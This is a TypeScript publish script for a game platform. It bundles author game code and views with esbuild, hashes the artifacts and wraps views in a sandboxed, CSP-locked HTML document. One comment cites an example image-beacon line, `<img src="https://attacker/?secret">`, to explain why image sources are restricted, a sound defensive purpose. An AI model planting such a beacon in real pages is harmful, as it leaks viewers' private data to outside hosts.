/**
 * Publish step (runs on merge to main). For each game it:
 *   1. bundles the author entry into a single IIFE (esbuild) exposing
 *      `globalThis.__gameModule__.default` — the exact form the Arena sandbox loads
 *   2. computes a sha256 content-hash (pins the code a match runs against)
 *   3. writes dist/bundles/<slug>.js, dist/rules/<slug>.md
 * and finally writes dist/index.json — the manifest the Arena backend's
 * world-loader fetches to register + pull each pinned bundle.
 *
 * The Arena (private) backend pulls ONLY these built, hash-pinned artifacts —
 * it never imports author source. Run: `pnpm build:bundles`.
 */
import { readFile, readdir, writeFile, mkdir, rm } from 'node:fs/promises'
import { existsSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { createHash } from 'node:crypto'
import path from 'node:path'
import esbuild from 'esbuild'
import type { GameDefinition, ParamSpec } from '@arena/game-sdk'

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')
const GAMES_DIR = path.join(ROOT, 'games')
const DIST = path.join(ROOT, 'dist')

interface Manifest {
  type: string
  displayName?: string
  sdkVersion?: string
  entry: string
  players: { min: number; max: number }
  pace: string
  rules?: string
  /** Optional author T2 renderer; bundled into a sandboxed HTML doc. */
  view?: string
}

interface IndexEntry {
  type: string
  slug: string
  displayName: string
  pace: string
  /** All paces this game supports; a competition picks one via gameConfig.pace. */
  paces: string[]
  players: { min: number; max: number }
  sdkVersion: string
  contentHash: string
  bundle: string
  rules: string | null
  /** sha256 of `rulesMarkdown` — lets publish.yml's gate see rules-only edits. */
  rulesContentHash: string | null
  // Meta + params are published here so the Arena backend registers WITHOUT
  // running the sandbox at boot (introspection). The sandbox only runs per-match.
  maxSteps: number
  submitWindowSec: number | null
  turnTimeoutSec: number | null
  hiddenInfo: boolean
  params: Record<string, ParamSpec>
  // T2 sandboxed rendering: 'sandboxed' if the game ships a view, else 'declarative'.
  viewMode: 'declarative' | 'sandboxed'
  view: string | null
  viewContentHash: string | null
  // Inlined artifacts — the whole game travels INSIDE index.json so a release is a
  // single file (no per-file assets). The backend prefers these; `bundle`/`view`/
  // `rules` paths remain for local dir loads. contentHash is over `bundleCode`.
  bundleCode: string
  viewHtml: string | null
  rulesMarkdown: string | null
}

async function bundle(entryFile: string): Promise<string> {
  const out = await esbuild.build({
    entryPoints: [entryFile],
    bundle: true,
    format: 'iife',
    globalName: '__gameModule__',
    platform: 'browser',
    target: 'es2022',
    legalComments: 'none',
    write: false,
    logLevel: 'silent',
  })
  const text = out.outputFiles?.[0]?.text
  if (!text) throw new Error(`esbuild produced no output for ${entryFile}`)
  return text
}

/** Bundle an author view entry to inline JS (self-runs onFrame at load). */
export async function bundleView(entryFile: string): Promise<string> {
  const out = await esbuild.build({
    entryPoints: [entryFile],
    bundle: true,
    format: 'iife',
    platform: 'browser',
    target: 'es2022',
    legalComments: 'none',
    write: false,
    logLevel: 'silent',
  })
  const text = out.outputFiles?.[0]?.text
  if (!text) throw new Error(`esbuild produced no view output for ${entryFile}`)
  return text
}

/** Wrap author view JS in a self-contained, CSP-locked HTML doc (loaded into a sandbox iframe). */
export function viewHtml(js: string): string {
  const safe = js.replace(/<\/script>/gi, '<\\/script>')
  // img-src is data: ONLY (no https:). An `<img src="https://attacker/?secret">`
  // beacon is an outbound channel out of the browser even though connect-src is
  // 'none' — the request still leaves with the URL, carrying the viewer's private
  // per-viewer frame. Locking img-src to data: closes that exfil path (#2031).
  // Views must inline any art as data: URIs; avatars are drawn by the host UI
  // outside the sandbox, not by author view code. The Arena frontend also injects
  // this same strict policy into the srcdoc as defense in depth.
  return `<!doctype html><html><head><meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; connect-src 'none'; frame-src 'none'; base-uri 'none'; form-action 'none'">
<style>html,body{margin:0;background:#0b0b0f;color:#e2e8f0;font:14px system-ui}</style>
</head><body><script>${safe}</script></body></html>`
}

async function main() {
  await rm(DIST, { recursive: true, force: true })
  await mkdir(path.join(DIST, 'bundles'), { recursive: true })
  await mkdir(path.join(DIST, 'rules'), { recursive: true })
  await mkdir(path.join(DIST, 'views'), { recursive: true })

  const entries: IndexEntry[] = []
  for (const d of await readdir(GAMES_DIR, { withFileTypes: true })) {
    if (!d.isDirectory()) continue
    const dir = path.join(GAMES_DIR, d.name)
    const manifestPath = path.join(dir, 'game.manifest.json')
    if (!existsSync(manifestPath)) continue

    const manifest = JSON.parse(await readFile(manifestPath, 'utf8')) as Manifest
    // Read meta + params by importing the game (no sandbox needed — just the object).
    const mod = (await import(path.join(dir, manifest.entry))) as { default: GameDefinition<unknown, Record<string, number>> }
    const meta = mod.default.meta
    const params = (mod.default.params ?? {}) as Record<string, ParamSpec>

    const code = await bundle(path.join(dir, manifest.entry))
    const contentHash = createHash('sha256').update(code).digest('hex')
    await writeFile(path.join(DIST, 'bundles', `${manifest.type}.js`), code, 'utf8')

    let rules: string | null = null
    let rulesMarkdown: string | null = null
    let rulesContentHash: string | null = null
    if (manifest.rules && existsSync(path.join(dir, manifest.rules))) {
      rulesMarkdown = await readFile(path.join(dir, manifest.rules), 'utf8')
      rulesContentHash = createHash('sha256').update(rulesMarkdown).digest('hex')
      rules = `rules/${manifest.type}.md`
      await writeFile(path.join(DIST, rules), rulesMarkdown, 'utf8')
    }

    // T2: bundle the author view (if any) into a sandboxed HTML doc.
    let view: string | null = null
    let viewContentHash: string | null = null
    let html: string | null = null
    if (manifest.view && existsSync(path.join(dir, manifest.view))) {
      html = viewHtml(await bundleView(path.join(dir, manifest.view)))
      viewContentHash = createHash('sha256').update(html).digest('hex')
      view = `views/${manifest.type}.html`
      await writeFile(path.join(DIST, view), html, 'utf8')
    }

    entries.push({
      type: manifest.type,
      slug: d.name,
      displayName: manifest.displayName ?? manifest.type,
      pace: manifest.pace,
      paces: meta.paces ?? [manifest.pace],
      players: manifest.players,
      sdkVersion: manifest.sdkVersion ?? '0.0.0',
      contentHash,
      bundle: `bundles/${manifest.type}.js`,
      rules,
      rulesContentHash,
      maxSteps: meta.maxSteps ?? 10_000,
      submitWindowSec: meta.submitWindowSec ?? null,
      turnTimeoutSec: meta.turnTimeoutSec ?? null,
      hiddenInfo: meta.hiddenInfo ?? false,
      params,
      viewMode: view ? 'sandboxed' : 'declarative',
      view,
      viewContentHash,
      bundleCode: code,
      viewHtml: html,
      rulesMarkdown,
    })
    console.log(`bundled ${manifest.type} (${(code.length / 1024).toFixed(1)}kb, ${contentHash.slice(0, 12)})${view ? ' + sandboxed view' : ''}`)
  }

  await writeFile(path.join(DIST, 'index.json'), JSON.stringify({ version: 1, games: entries }, null, 2), 'utf8')
  console.log(`\nwrote dist/index.json with ${entries.length} game(s)`)
}

// Only run the full build when invoked directly (not when imported for viewHtml/bundleView).
if (import.meta.url === `file://${process.argv[1]}`) {
  main().catch((e) => {
    console.error(e)
    process.exit(1)
  })
}
